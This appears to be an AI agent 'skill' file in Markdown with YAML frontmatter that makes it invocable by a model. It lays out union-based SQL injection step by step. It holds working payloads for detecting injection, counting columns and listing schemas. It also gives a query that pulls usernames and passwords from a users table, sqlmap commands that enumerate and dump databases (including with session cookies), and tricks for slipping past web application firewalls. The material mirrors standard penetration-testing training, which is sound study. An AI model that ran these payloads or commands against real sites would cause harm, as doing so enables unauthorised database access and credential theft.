---
name: sqli-union
description: "SQL Injection - Union Based exploitation technique"
user-invocable: true
disable-model-invocation: false
metadata:
  kerkov:
    category: web/injection/sqli
    mitre: T1190
    difficulty: beginner
    platforms: [mysql, postgres, mssql]
    tags: [web, database, injection, sqli]
    requires:
      bins: [sqlmap]
---

# SQL Injection — Union Based

## Detection

Look for reflected query output in the response. Common indicators:

1. **Error-based detection**: Inject a single quote `'` and look for SQL errors:
   - MySQL: `You have an error in your SQL syntax`
   - PostgreSQL: `ERROR: syntax error at or near`
   - MSSQL: `Unclosed quotation mark`

2. **Boolean-based detection**: Compare responses between:
   - `' OR 1=1--` (always true)
   - `' OR 1=2--` (always false)

3. **Confirm injectability**: Use time-based confirmation if needed:
   - MySQL: `' OR SLEEP(5)--`
   - PostgreSQL: `'; SELECT pg_sleep(5)--`

## Exploitation

### Step 1: Determine Column Count

Use `ORDER BY` to find the number of columns:

```
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

Increment until you get an error. The last successful number is the column count.

### Step 2: Find Reflected Columns

```sql
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
```

Replace NULLs one at a time with a string to find which columns are reflected.

### Step 3: Extract Data

**Database version:**
- MySQL: `' UNION SELECT @@version,NULL,NULL-- -`
- PostgreSQL: `' UNION SELECT version(),NULL,NULL-- -`
- MSSQL: `' UNION SELECT @@version,NULL,NULL-- -`

**List databases (MySQL):**
```sql
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -
```

**List tables:**
```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='target_db'-- -
```

**List columns:**
```sql
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='target_table'-- -
```

**Extract data:**
```sql
' UNION SELECT username,password,NULL FROM users-- -
```

## Tool Integration

### sqlmap

**Basic detection:**
```bash
sqlmap -u "http://target.com/page?id=1" --batch --banner
```

**Full enumeration:**
```bash
sqlmap -u "http://target.com/page?id=1" --batch --dbs
sqlmap -u "http://target.com/page?id=1" --batch -D target_db --tables
sqlmap -u "http://target.com/page?id=1" --batch -D target_db -T users --dump
```

**With cookie/auth:**
```bash
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123" --batch --dbs
```

**POST request:**
```bash
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch --dbs
```

## Evasion / Bypasses

- **Space bypass**: Use `/**/` or `+` instead of spaces
- **Quote bypass**: Use `CHAR()` function: `CHAR(97)` = `'a'`
- **Keyword bypass**: Use mixed case (`SeLeCt`), double keywords (`SELSELECTECT`)
- **URL encoding**: `%27` for `'`, `%20` for space
- **Comment tricks**: `/*!UNION*/` for MySQL version-specific comments

## Common Mistakes

- Forgetting to comment out the rest of the query (`-- -` or `#`)
- Not URL-encoding payloads when testing in a browser
- Assuming column count without verifying with `ORDER BY`
- Not checking for WAF before sending obvious payloads
- Using `UNION SELECT` before confirming the injection point

## References

- [PortSwigger - SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- MITRE ATT&CK T1190 - Exploit Public-Facing Application
- OWASP Testing Guide - SQL Injection
